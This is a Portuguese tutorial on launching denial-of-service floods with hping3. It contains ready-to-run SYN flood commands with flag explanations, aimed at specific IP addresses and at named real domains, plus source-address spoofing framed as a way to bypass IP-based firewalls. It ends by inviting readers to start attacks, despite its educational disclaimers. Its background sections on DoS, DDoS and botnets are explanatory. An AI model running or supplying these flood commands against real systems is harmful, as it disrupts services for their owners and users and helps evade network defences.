# DOS Flood com hping3

Este tutorial explica como executar ataques DDOS (Negação de Serviço Distribuída) usando a ferramenta hping3.

Depois de ler este artigo, você poderá instalar o hping3 para executar tanto os testes de DOS quanto de DDOS. Exceto pelo processo de instalação baseado no Debian, o restante deste documento é válido para todas as distribuições Linux.

Caso você não esteja familiarizado com ataques de DOS e DDOS, talvez queira começar lendo uma introdução sobre DOS e DDOS.

Todos os passos descritos abaixo incluem capturas de tela para facilitar o acompanhamento de todos os usuários de Linux.

>⚠️ **Aviso**: Este conteúdo é apenas para fins educacionais e de teste em ambientes autorizados. O uso não autorizado pode ser crime em muitos países.

<br/>

##  Sobre hping3

A ferramenta hping3 permite enviar pacotes manipulados, incluindo tamanho, quantidade e fragmentação dos pacotes para sobrecarregar o alvo e burlar ou atacar firewalls. O Hping3 pode ser útil para fins de segurança ou testes de capacidade. Ao usá-lo, você pode testar a eficácia do firewall e se um servidor consegue lidar com uma grande quantidade de conexões. Abaixo você encontrará instruções sobre como usar o hping3 para fins de testes de segurança.

<br/>

## Iniciando com hping3

Para instalar o hping3 no Debian e em suas distribuições Linux baseadas, incluindo o Ubuntu, use o gerenciador de pacotes apt, conforme mostrado na captura de tela abaixo.


### Instalando com apt e yum

```bash
sudo apt install hping3 -y
```

Em distribuições Linux baseadas em CentOS ou RedHat, você pode instalar o hping3 usando yum, como mostrado abaixo.


```bash
sudo yum -y install hping3
```

<br/>

## Um ataque simples de DOS (não DDOS):

```bash
sudo hping3 -S --flood -V -p 80 170.155.9.185
```

| COMANDOS | DESCRIÇÃO |
|-----------|-----------|
| sudo | Dá os privilégios necessários para rodar o hping3 |
| hping3 | Chama o programa HPING3 |
| -S | especifica pacotes SYN |
| --flood |  Envia pacotes o mais rápido possível, ignorando respostas |
| -V | Modo verbose |
| -p 80 | Porta 80, você pode substituir esse número pelo serviço que deseja atacar |
| 170.155.9.185 |  IP alvo |

<br/>

## Flood usando pacotes SYN contra a porta 80

Os pacotes SYN incluem a solicitação de confirmação de sincronização de conexão.

O exemplo a seguir mostra um ataque SYN contra lacampora.org:

```bash
sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source
```

| COMANDOS | DESCRIÇÃO |
|-----------|-----------|
| lacampora.org | Alvo definido por nome de domínio |
| -q | Modo "quiet" – saída reduzida |
| -n | Mostra o IP numérico em vez de resolver o hostname |
| -d 120 | Define o tamanho do pacote como 120 bytes |
| –rand-source | Usa endereços IP de origem aleatórios (falsificados) |

O exemplo a seguir mostra outro possível teste de inundação SYN para a porta 80.

```bash
sudo hping3 --rand-source ivan.com -S -q -p 80 --flood
```

<br/>

## Flood com endereço IP falso (spoofing)

Com o hping3 você também pode falsificar (spoof) o endereço IP de origem. Para burlar firewalls baseados em IP, você pode até clonar o IP do próprio alvo ou de um endereço confiável previamente identificado (por exemplo, com Nmap ou um sniffer).

### A sintaxe é a seguinte:

```bash
sudo hping3 -a <FAKE IP> <target> -S -q -p 80
```

No exemplo abaixo, substituí meu endereço IP real pelo IP 190.0.174.10.

```bash
sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80
```

>⚠️ **Importante**: O spoofing de IP não funciona bem em redes modernas com roteamento assimétrico ou com sistemas de defesa como uRPF (Unicast Reverse Path Forwarding). Além disso, muitos provedores bloqueiam pacotes com IPs de origem inválidos.

<br/>

## Ataques DOS e DDOS

Um ataque de inundação (flood) em DOS é uma técnica muito simples para negar acessibilidade a serviços (por isso é chamado de ataque de "negação de serviço"). Esse ataque consiste em sobrecarregar o alvo com pacotes superdimensionados ou com uma grande quantidade deles.

Embora esse ataque seja muito fácil de executar, ele não compromete as informações ou a privacidade do alvo. Não é um ataque penetrativo e visa apenas impedir o acesso ao alvo.

Ao enviar uma grande quantidade de pacotes, o alvo não consegue lidar com os atacantes, que impedem o servidor de atender usuários legítimos.

Ataques DOS são realizados a partir de um único dispositivo; portanto, é fácil detê-los bloqueando o IP do atacante. Ainda assim, o atacante pode alterar e até falsificar (clonar) o endereço IP de origem. Mas não é difícil para firewalls lidarem com esses ataques, ao contrário do que acontece com ataques DDOS.

Um ataque de Negação de Serviço Distribuída (DDOS) é semelhante a um ataque DOS, mas realizado simultaneamente a partir de diferentes nós (ou atacantes diferentes). Ataques DDOS são realizados por botnets. Botnets são redes de computadores infectados (zumbis) controlados remotamente por um atacante. Um hacker pode criar uma botnet e infectar muitos computadores, a partir dos quais os bots lançam ataques DOS. O fato de muitos bots estarem atacando simultaneamente transforma o ataque DOS em um ataque DDOS (por isso é chamado de "distribuído").

Claro, há exceções em que ataques DDOS foram realizados por atacantes humanos reais. Por exemplo, o grupo de hackers Anonymous, integrado por milhares de pessoas ao redor do mundo, usou essa técnica com muita frequência devido à sua facilidade de implementação (ela só exigia voluntários que compartilhassem sua causa). Foi assim que o Anonymous deixou o governo líbio de Gaddafi completamente desconectado durante a invasão. O Estado líbio ficou indefeso diante de milhares de atacantes do mundo todo.

Esse tipo de ataque, quando realizado a partir de vários nós diferentes, é extremamente difícil de prevenir e parar. Normalmente, isso requer hardware especial para lidar com a situação. Isso porque firewalls e aplicações defensivas não estão preparados para lidar com milhares de atacantes simultaneamente. Esse não é o caso do hping3. A maioria dos ataques realizados por meio dessa ferramenta será bloqueada por dispositivos ou softwares defensivos, mas ela é útil em redes locais ou contra alvos mal protegidos.

Agora você pode começar a lançar ataques de teste de DOS e DDOS com o hping3.

<br/>

## Conclusão

Como você pode ver, executar ataques de inundação (flood) é surpreendentemente simples. Essa simplicidade é um exemplo do perigo ao qual empresas e provedores de serviço estão expostos diariamente.

Em alguns casos, ataques DDOS podem ser fatais para negócios, causando prejuízos financeiros enormes e danos à reputação. Embora existam soluções de hardware e software para mitigá-los, as técnicas de ataque evoluem constantemente, especialmente quando muitos atacantes estão envolvidos.

Lembre-se: utilize este conhecimento com responsabilidade, sempre em ambientes que você possui autorização para testar. Nunca ataque sistemas de terceiros sem permissão explícita.

<br/>

### Sobre o autor

**Guilherme Alexander** – Entusiasta de segurança da informação e infraestrutura de redes. Este material foi criado para fins educacionais e de conscientização sobre ameaças cibernéticas.

###
